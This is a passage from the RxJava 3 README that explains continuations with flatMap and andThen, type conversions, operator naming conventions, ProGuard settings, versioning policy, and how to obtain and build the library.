&lt;pre&gt;&lt;code class="language-java"&gt;Flowable&amp;lt;Inventory&amp;gt; inventorySource = warehouse.getInventoryAsync();

inventorySource
    .flatMap(inventoryItem -&amp;gt; erp.getDemandAsync(inventoryItem.getId())
            .map(demand -&amp;gt; "Item " + inventoryItem.getName() + " has demand " + demand))
    .subscribe(System.out::println);
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Continuations&lt;/h3&gt; 
&lt;p&gt;Sometimes, when an item has become available, one would like to perform some dependent computations on it. This is sometimes called &lt;strong&gt;continuations&lt;/strong&gt; and, depending on what should happen and what types are involved, may involve various operators to accomplish.&lt;/p&gt; 
&lt;h4&gt;Dependent&lt;/h4&gt; 
&lt;p&gt;The most typical scenario is to given a value, invoke another service, await and continue with its result:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-java"&gt;service.apiCall()
.flatMap(value -&amp;gt; service.anotherApiCall(value))
.flatMap(next -&amp;gt; service.finalCall(next))
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;It is often the case also that later sequences would require values from earlier mappings. This can be achieved by moving the outer &lt;code&gt;flatMap&lt;/code&gt; into the inner parts of the previous &lt;code&gt;flatMap&lt;/code&gt; for example:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-java"&gt;service.apiCall()
.flatMap(value -&amp;gt;
    service.anotherApiCall(value)
    .flatMap(next -&amp;gt; service.finalCallBoth(value, next))
)
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Here, the original &lt;code&gt;value&lt;/code&gt; will be available inside the inner &lt;code&gt;flatMap&lt;/code&gt;, courtesy of lambda variable capture.&lt;/p&gt; 
&lt;h4&gt;Non-dependent&lt;/h4&gt; 
&lt;p&gt;In other scenarios, the result(s) of the first source/dataflow is irrelevant and one would like to continue with a quasi independent another source. Here, &lt;code&gt;flatMap&lt;/code&gt; works as well:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-java"&gt;Observable continued = sourceObservable.flatMapSingle(ignored -&amp;gt; someSingleSource)
continued.map(v -&amp;gt; v.toString())
  .subscribe(System.out::println, Throwable::printStackTrace);
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;however, the continuation in this case stays &lt;code&gt;Observable&lt;/code&gt; instead of the likely more appropriate &lt;code&gt;Single&lt;/code&gt;. (This is understandable because from the perspective of &lt;code&gt;flatMapSingle&lt;/code&gt;, &lt;code&gt;sourceObservable&lt;/code&gt; is a multi-valued source and thus the mapping may result in multiple values as well).&lt;/p&gt; 
&lt;p&gt;Often though there is a way that is somewhat more expressive (and also lower overhead) by using &lt;code&gt;Completable&lt;/code&gt; as the mediator and its operator &lt;code&gt;andThen&lt;/code&gt; to resume with something else:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-java"&gt;sourceObservable
  .ignoreElements()           // returns Completable
  .andThen(someSingleSource)
  .map(v -&amp;gt; v.toString())
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;The only dependency between the &lt;code&gt;sourceObservable&lt;/code&gt; and the &lt;code&gt;someSingleSource&lt;/code&gt; is that the former should complete normally in order for the latter to be consumed.&lt;/p&gt; 
&lt;h4&gt;Deferred-dependent&lt;/h4&gt; 
&lt;p&gt;Sometimes, there is an implicit data dependency between the previous sequence and the new sequence that, for some reason, was not flowing through the "regular channels". One would be inclined to write such continuations as follows:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-java"&gt;AtomicInteger count = new AtomicInteger();

Observable.range(1, 10)
  .doOnNext(ignored -&amp;gt; count.incrementAndGet())
  .ignoreElements()
  .andThen(Single.just(count.get()))
  .subscribe(System.out::println);
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Unfortunately, this prints &lt;code&gt;0&lt;/code&gt; because &lt;code&gt;Single.just(count.get())&lt;/code&gt; is evaluated at &lt;strong&gt;assembly time&lt;/strong&gt; when the dataflow hasn't even run yet. We need something that defers the evaluation of this &lt;code&gt;Single&lt;/code&gt; source until &lt;strong&gt;runtime&lt;/strong&gt; when the main source completes:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-java"&gt;AtomicInteger count = new AtomicInteger();

Observable.range(1, 10)
  .doOnNext(ignored -&amp;gt; count.incrementAndGet())
  .ignoreElements()
  .andThen(Single.defer(() -&amp;gt; Single.just(count.get())))
  .subscribe(System.out::println);
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;or&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-java"&gt;AtomicInteger count = new AtomicInteger();

Observable.range(1, 10)
  .doOnNext(ignored -&amp;gt; count.incrementAndGet())
  .ignoreElements()
  .andThen(Single.fromCallable(() -&amp;gt; count.get()))
  .subscribe(System.out::println);
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Type conversions&lt;/h3&gt; 
&lt;p&gt;Sometimes, a source or service returns a different type than the flow that is supposed to work with it. For example, in the inventory example above, &lt;code&gt;getDemandAsync&lt;/code&gt; could return a &lt;code&gt;Single&amp;lt;DemandRecord&amp;gt;&lt;/code&gt;. If the code example is left unchanged, this will result in a compile-time error (however, often with a misleading error message about lack of overload).&lt;/p&gt; 
&lt;p&gt;In such situations, there are usually two options to fix the transformation: 1) convert to the desired type or 2) find and use an overload of the specific operator supporting the different type.&lt;/p&gt; 
&lt;h4&gt;Converting to the desired type&lt;/h4&gt; 
&lt;p&gt;Each reactive base class features operators that can perform such conversions, including the protocol conversions, to match some other type. The following matrix shows the available conversion options:&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;&lt;/th&gt; 
   &lt;th&gt;Flowable&lt;/th&gt; 
   &lt;th&gt;Observable&lt;/th&gt; 
   &lt;th&gt;Single&lt;/th&gt; 
   &lt;th&gt;Maybe&lt;/th&gt; 
   &lt;th&gt;Completable&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Flowable&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;toObservable&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;first&lt;/code&gt;, &lt;code&gt;firstOrError&lt;/code&gt;, &lt;code&gt;single&lt;/code&gt;, &lt;code&gt;singleOrError&lt;/code&gt;, &lt;code&gt;last&lt;/code&gt;, &lt;code&gt;lastOrError&lt;/code&gt;&lt;sup&gt;1&lt;/sup&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;firstElement&lt;/code&gt;, &lt;code&gt;singleElement&lt;/code&gt;, &lt;code&gt;lastElement&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;ignoreElements&lt;/code&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Observable&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;toFlowable&lt;/code&gt;&lt;sup&gt;2&lt;/sup&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;first&lt;/code&gt;, &lt;code&gt;firstOrError&lt;/code&gt;, &lt;code&gt;single&lt;/code&gt;, &lt;code&gt;singleOrError&lt;/code&gt;, &lt;code&gt;last&lt;/code&gt;, &lt;code&gt;lastOrError&lt;/code&gt;&lt;sup&gt;1&lt;/sup&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;firstElement&lt;/code&gt;, &lt;code&gt;singleElement&lt;/code&gt;, &lt;code&gt;lastElement&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;ignoreElements&lt;/code&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Single&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;toFlowable&lt;/code&gt;&lt;sup&gt;3&lt;/sup&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;toObservable&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;toMaybe&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;ignoreElement&lt;/code&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Maybe&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;toFlowable&lt;/code&gt;&lt;sup&gt;3&lt;/sup&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;toObservable&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;toSingle&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;ignoreElement&lt;/code&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Completable&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;toFlowable&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;toObservable&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;toSingle&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;toMaybe&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;p&gt;&lt;sup&gt;1&lt;/sup&gt;: When turning a multi-valued source into a single-valued source, one should decide which of the many source values should be considered as the result.&lt;/p&gt; 
&lt;p&gt;&lt;sup&gt;2&lt;/sup&gt;: Turning an &lt;code&gt;Observable&lt;/code&gt; into &lt;code&gt;Flowable&lt;/code&gt; requires an additional decision: what to do with the potential unconstrained flow of the source &lt;code&gt;Observable&lt;/code&gt;? There are several strategies available (such as buffering, dropping, keeping the latest) via the &lt;code&gt;BackpressureStrategy&lt;/code&gt; parameter or via standard &lt;code&gt;Flowable&lt;/code&gt; operators such as &lt;code&gt;onBackpressureBuffer&lt;/code&gt;, &lt;code&gt;onBackpressureDrop&lt;/code&gt;, &lt;code&gt;onBackpressureLatest&lt;/code&gt; which also allow further customization of the backpressure behavior.&lt;/p&gt; 
&lt;p&gt;&lt;sup&gt;3&lt;/sup&gt;: When there is only (at most) one source item, there is no problem with backpressure as it can be always stored until the downstream is ready to consume.&lt;/p&gt; 
&lt;h4&gt;Using an overload with the desired type&lt;/h4&gt; 
&lt;p&gt;Many frequently used operator has overloads that can deal with the other types. These are usually named with the suffix of the target type:&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Operator&lt;/th&gt; 
   &lt;th&gt;Overloads&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;code&gt;flatMap&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;flatMapSingle&lt;/code&gt;, &lt;code&gt;flatMapMaybe&lt;/code&gt;, &lt;code&gt;flatMapCompletable&lt;/code&gt;, &lt;code&gt;flatMapIterable&lt;/code&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;code&gt;concatMap&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;concatMapSingle&lt;/code&gt;, &lt;code&gt;concatMapMaybe&lt;/code&gt;, &lt;code&gt;concatMapCompletable&lt;/code&gt;, &lt;code&gt;concatMapIterable&lt;/code&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;code&gt;switchMap&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;switchMapSingle&lt;/code&gt;, &lt;code&gt;switchMapMaybe&lt;/code&gt;, &lt;code&gt;switchMapCompletable&lt;/code&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;p&gt;The reason these operators have a suffix instead of simply having the same name with different signature is type erasure. Java doesn't consider signatures such as &lt;code&gt;operator(Function&amp;lt;T, Single&amp;lt;R&amp;gt;&amp;gt;)&lt;/code&gt; and &lt;code&gt;operator(Function&amp;lt;T, Maybe&amp;lt;R&amp;gt;&amp;gt;)&lt;/code&gt; different (unlike C#) and due to erasure, the two &lt;code&gt;operator&lt;/code&gt;s would end up as duplicate methods with the same signature.&lt;/p&gt; 
&lt;h3&gt;Operator naming conventions&lt;/h3&gt; 
&lt;p&gt;Naming in programming is one of the hardest things as names are expected to be not long, expressive, capturing and easily memorable. Unfortunately, the target language (and pre-existing conventions) may not give too much help in this regard (unusable keywords, type erasure, type ambiguities, etc.).&lt;/p&gt; 
&lt;h4&gt;Unusable keywords&lt;/h4&gt; 
&lt;p&gt;In the original Rx.NET, the operator that emits a single item and then completes is called &lt;code&gt;Return(T)&lt;/code&gt;. Since the Java convention is to have a lowercase letter start a method name, this would have been &lt;code&gt;return(T)&lt;/code&gt; which is a keyword in Java and thus not available. Therefore, RxJava chose to name this operator &lt;code&gt;just(T)&lt;/code&gt;. The same limitation exists for the operator &lt;code&gt;Switch&lt;/code&gt;, which had to be named &lt;code&gt;switchOnNext&lt;/code&gt;. Yet another example is &lt;code&gt;Catch&lt;/code&gt; which was named &lt;code&gt;onErrorResumeNext&lt;/code&gt;.&lt;/p&gt; 
&lt;h4&gt;Type erasure&lt;/h4&gt; 
&lt;p&gt;Many operators that expect the user to provide some function returning a reactive type can't be overloaded because the type erasure around a &lt;code&gt;Function&amp;lt;T, X&amp;gt;&lt;/code&gt; turns such method signatures into duplicates. RxJava chose to name such operators by appending the type as suffix as well:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-java"&gt;Flowable&amp;lt;R&amp;gt; flatMap(Function&amp;lt;? super T, ? extends Publisher&amp;lt;? extends R&amp;gt;&amp;gt; mapper)

Flowable&amp;lt;R&amp;gt; flatMapMaybe(Function&amp;lt;? super T, ? extends MaybeSource&amp;lt;? extends R&amp;gt;&amp;gt; mapper)
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;Type ambiguities&lt;/h4&gt; 
&lt;p&gt;Even though certain operators have no problems from type erasure, their signature may turn up being ambiguous, especially if one uses Java 8 and lambdas. For example, there are several overloads of &lt;code&gt;concatWith&lt;/code&gt; taking the various other reactive base types as arguments (for providing convenience and performance benefits in the underlying implementation):&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-java"&gt;Flowable&amp;lt;T&amp;gt; concatWith(Publisher&amp;lt;? extends T&amp;gt; other);

Flowable&amp;lt;T&amp;gt; concatWith(SingleSource&amp;lt;? extends T&amp;gt; other);
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Both &lt;code&gt;Publisher&lt;/code&gt; and &lt;code&gt;SingleSource&lt;/code&gt; appear as functional interfaces (types with one abstract method) and may encourage users to try to provide a lambda expression:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-java"&gt;someSource.concatWith(s -&amp;gt; Single.just(2))
.subscribe(System.out::println, Throwable::printStackTrace);
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Unfortunately, this approach doesn't work and the example does not print &lt;code&gt;2&lt;/code&gt; at all. In fact, since version 2.1.10, it doesn't even compile because at least 4 &lt;code&gt;concatWith&lt;/code&gt; overloads exist and the compiler finds the code above ambiguous.&lt;/p&gt; 
&lt;p&gt;The user in such situations probably wanted to defer some computation until the &lt;code&gt;someSource&lt;/code&gt; has completed, thus the correct unambiguous operator should have been &lt;code&gt;defer&lt;/code&gt;:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-java"&gt;someSource.concatWith(Single.defer(() -&amp;gt; Single.just(2)))
.subscribe(System.out::println, Throwable::printStackTrace);
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Sometimes, a suffix is added to avoid logical ambiguities that may compile but produce the wrong type in a flow:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-java"&gt;Flowable&amp;lt;T&amp;gt; merge(Publisher&amp;lt;? extends Publisher&amp;lt;? extends T&amp;gt;&amp;gt; sources);

Flowable&amp;lt;T&amp;gt; mergeArray(Publisher&amp;lt;? extends T&amp;gt;... sources);
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;This can get also ambiguous when functional interface types get involved as the type argument &lt;code&gt;T&lt;/code&gt;.&lt;/p&gt; 
&lt;h4&gt;Error handling&lt;/h4&gt; 
&lt;p&gt;Dataflows can fail, at which point the error is emitted to the consumer(s). Sometimes though, multiple sources may fail at which point there is a choice whether or not wait for all of them to complete or fail. To indicate this opportunity, many operator names are suffixed with the &lt;code&gt;DelayError&lt;/code&gt; words (while others feature a &lt;code&gt;delayError&lt;/code&gt; or &lt;code&gt;delayErrors&lt;/code&gt; boolean flag in one of their overloads):&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-java"&gt;Flowable&amp;lt;T&amp;gt; concat(Publisher&amp;lt;? extends Publisher&amp;lt;? extends T&amp;gt;&amp;gt; sources);

Flowable&amp;lt;T&amp;gt; concatDelayError(Publisher&amp;lt;? extends Publisher&amp;lt;? extends T&amp;gt;&amp;gt; sources);
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Of course, suffixes of various kinds may appear together:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-java"&gt;Flowable&amp;lt;T&amp;gt; concatArrayEagerDelayError(Publisher&amp;lt;? extends T&amp;gt;... sources);
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;Base class vs base type&lt;/h4&gt; 
&lt;p&gt;The base classes can be considered heavy due to the sheer number of static and instance methods on them. RxJava 3's design was heavily influenced by the &lt;a href="https://github.com/reactive-streams/reactive-streams-jvm#reactive-streams"&gt;Reactive Streams&lt;/a&gt; specification, therefore, the library features a class and an interface per each reactive type:&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Type&lt;/th&gt; 
   &lt;th&gt;Class&lt;/th&gt; 
   &lt;th&gt;Interface&lt;/th&gt; 
   &lt;th&gt;Consumer&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;0..N backpressured&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;Flowable&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;Publisher&lt;/code&gt;&lt;sup&gt;1&lt;/sup&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;Subscriber&lt;/code&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;0..N unbounded&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;Observable&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;ObservableSource&lt;/code&gt;&lt;sup&gt;2&lt;/sup&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;Observer&lt;/code&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;1 element or error&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;Single&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;SingleSource&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;SingleObserver&lt;/code&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;0..1 element or error&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;Maybe&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;MaybeSource&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;MaybeObserver&lt;/code&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;0 element or error&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;Completable&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;CompletableSource&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;CompletableObserver&lt;/code&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;p&gt;&lt;sup&gt;1&lt;/sup&gt;The &lt;code&gt;org.reactivestreams.Publisher&lt;/code&gt; is part of the external Reactive Streams library. It is the main type to interact with other reactive libraries through a standardized mechanism governed by the &lt;a href="https://github.com/reactive-streams/reactive-streams-jvm#specification"&gt;Reactive Streams specification&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;&lt;sup&gt;2&lt;/sup&gt;The naming convention of the interface was to append &lt;code&gt;Source&lt;/code&gt; to the semi-traditional class name. There is no &lt;code&gt;FlowableSource&lt;/code&gt; since &lt;code&gt;Publisher&lt;/code&gt; is provided by the Reactive Streams library (and subtyping it wouldn't have helped with interoperation either). These interfaces are, however, not standard in the sense of the Reactive Streams specification and are currently RxJava specific only.&lt;/p&gt; 
&lt;h3&gt;R8 and ProGuard settings&lt;/h3&gt; 
&lt;p&gt;By default, RxJava itself doesn't require any ProGuard/R8 settings and should work without problems. Unfortunately, the Reactive Streams dependency since version 1.0.3 has embedded Java 9 class files in its JAR that can cause warnings with the plain ProGuard:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;Warning: org.reactivestreams.FlowAdapters$FlowPublisherFromReactive: can't find superclass or interface java.util.concurrent.Flow$Publisher
Warning: org.reactivestreams.FlowAdapters$FlowToReactiveProcessor: can't find superclass or interface java.util.concurrent.Flow$Processor
Warning: org.reactivestreams.FlowAdapters$FlowToReactiveSubscriber: can't find superclass or interface java.util.concurrent.Flow$Subscriber
Warning: org.reactivestreams.FlowAdapters$FlowToReactiveSubscription: can't find superclass or interface java.util.concurrent.Flow$Subscription
Warning: org.reactivestreams.FlowAdapters: can't find referenced class java.util.concurrent.Flow$Publisher
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;It is recommended one sets up the following &lt;code&gt;-dontwarn&lt;/code&gt; entry in the application's &lt;code&gt;proguard-ruleset&lt;/code&gt; file:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;-dontwarn java.util.concurrent.Flow*
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;For R8, the RxJava jar includes the &lt;code&gt;META-INF/proguard/rxjava3.pro&lt;/code&gt; with the same no-warning clause and should apply automatically.&lt;/p&gt; 
&lt;h3&gt;Further reading&lt;/h3&gt; 
&lt;p&gt;For further details, consult the &lt;a href="https://github.com/ReactiveX/RxJava/wiki"&gt;wiki&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Communication&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;Google Group: &lt;a href="http://groups.google.com/d/forum/rxjava"&gt;RxJava&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;Twitter: &lt;a href="http://twitter.com/RxJava"&gt;@RxJava&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/ReactiveX/RxJava/issues"&gt;GitHub Issues&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;StackOverflow: &lt;a href="http://stackoverflow.com/questions/tagged/rx-java"&gt;rx-java&lt;/a&gt;, &lt;a href="http://stackoverflow.com/questions/tagged/rx-java2"&gt;rx-java2&lt;/a&gt; and &lt;a href="http://stackoverflow.com/questions/tagged/rx-java3"&gt;rx-java3&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://gitter.im/ReactiveX/RxJava"&gt;Gitter.im&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Versioning&lt;/h2&gt; 
&lt;p&gt;Version 3.x is in development. Bugfixes will be applied to both 2.x and 3.x branches, but new features will only be added to 3.x.&lt;/p&gt; 
&lt;p&gt;Minor 3.x increments (such as 3.1, 3.2, etc) will occur when non-trivial new functionality is added or significant enhancements or bug fixes occur that may have behavioral changes that may affect some edge cases (such as dependence on behavior resulting from a bug). An example of an enhancement that would classify as this is adding reactive pull backpressure support to an operator that previously did not support it. This should be backwards compatible but does behave differently.&lt;/p&gt; 
&lt;p&gt;Patch 3.x.y increments (such as 3.0.0 -&amp;gt; 3.0.1, 3.3.1 -&amp;gt; 3.3.2, etc) will occur for bug fixes and trivial functionality (like adding a method overload). New functionality marked with an &lt;a href="https://github.com/ReactiveX/RxJava/raw/3.x/src/main/java/io/reactivex/rxjava3/annotations/Beta.java"&gt;&lt;code&gt;@Beta&lt;/code&gt;&lt;/a&gt; or &lt;a href="https://github.com/ReactiveX/RxJava/raw/3.x/src/main/java/io/reactivex/rxjava3/annotations/Experimental.java"&gt;&lt;code&gt;@Experimental&lt;/code&gt;&lt;/a&gt; annotation can also be added in the patch releases to allow rapid exploration and iteration of unstable new functionality.&lt;/p&gt; 
&lt;h4&gt;@Beta&lt;/h4&gt; 
&lt;p&gt;APIs marked with the &lt;a href="https://github.com/ReactiveX/RxJava/raw/3.x/src/main/java/io/reactivex/rxjava3/annotations/Beta.java"&gt;&lt;code&gt;@Beta&lt;/code&gt;&lt;/a&gt; annotation at the class or method level are subject to change. They can be modified in any way, or even removed, at any time. If your code is a library itself (i.e. it is used on the CLASSPATH of users outside your control), you should not use beta APIs, unless you repackage them (e.g. using ProGuard, shading, etc).&lt;/p&gt; 
&lt;h4&gt;@Experimental&lt;/h4&gt; 
&lt;p&gt;APIs marked with the &lt;a href="https://github.com/ReactiveX/RxJava/raw/3.x/src/main/java/io/reactivex/rxjava3/annotations/Experimental.java"&gt;&lt;code&gt;@Experimental&lt;/code&gt;&lt;/a&gt; annotation at the class or method level will almost certainly change. They can be modified in any way, or even removed, at any time. You should not use or rely on them in any production code. They are purely to allow broad testing and feedback.&lt;/p&gt; 
&lt;h4&gt;@Deprecated&lt;/h4&gt; 
&lt;p&gt;APIs marked with the &lt;code&gt;@Deprecated&lt;/code&gt; annotation at the class or method level will remain supported until the next major release, but it is recommended to stop using them.&lt;/p&gt; 
&lt;h4&gt;io.reactivex.rxjava3.internal.*&lt;/h4&gt; 
&lt;p&gt;All code inside the &lt;code&gt;io.reactivex.rxjava3.internal.*&lt;/code&gt; packages are considered private API and should not be relied upon at all. It can change at any time.&lt;/p&gt; 
&lt;h2&gt;Full Documentation&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://github.com/ReactiveX/RxJava/wiki"&gt;Wiki&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="http://reactivex.io/RxJava/3.x/javadoc/"&gt;Javadoc&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="http://reactivex.io/RxJava/3.x/javadoc/snapshot/"&gt;Latest snaphot Javadoc&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;Javadoc of a specific &lt;a href="https://github.com/ReactiveX/RxJava/tags"&gt;release version&lt;/a&gt;: &lt;code&gt;http://reactivex.io/RxJava/3.x/javadoc/3.x.y/&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Binaries&lt;/h2&gt; 
&lt;p&gt;Binaries and dependency information for Maven, Ivy, Gradle and others can be found at &lt;a href="http://search.maven.org/#search%7Cga%7C1%7Cio.reactivex.rxjava3"&gt;http://search.maven.org&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;Example for Gradle:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-groovy"&gt;implementation 'io.reactivex.rxjava3:rxjava:x.y.z'
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;and for Maven:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-xml"&gt;&amp;lt;dependency&amp;gt;
    &amp;lt;groupId&amp;gt;io.reactivex.rxjava3&amp;lt;/groupId&amp;gt;
    &amp;lt;artifactId&amp;gt;rxjava&amp;lt;/artifactId&amp;gt;
    &amp;lt;version&amp;gt;x.y.z&amp;lt;/version&amp;gt;
&amp;lt;/dependency&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;and for Ivy:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-xml"&gt;&amp;lt;dependency org="io.reactivex.rxjava3" name="rxjava" rev="x.y.z" /&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Snapshots&lt;/h3&gt; 
&lt;p&gt;Snapshots after May 19st, 2025 are available via &lt;a href="https://central.sonatype.com/repository/maven-snapshots/io/reactivex/rxjava3/rxjava/"&gt;https://central.sonatype.com/repository/maven-snapshots/io/reactivex/rxjava3/rxjava/&lt;/a&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-groovy"&gt;repositories {
  maven { url 'https://central.sonatype.com/repository/maven-snapshots' }
}

dependencies {
  implementation 'io.reactivex.rxjava3:rxjava:3.0.0-SNAPSHOT'
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;JavaDoc snapshots are available at &lt;a href="https://reactivex.io/RxJava/3.x/javadoc/snapshot"&gt;https://reactivex.io/RxJava/3.x/javadoc/snapshot&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Build&lt;/h2&gt; 
&lt;p&gt;To build:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;$ git clone git@github.com:ReactiveX/RxJava.git
$ cd RxJava/
$ ./gradlew build
&lt;/code&gt;&lt;/pre&gt; 
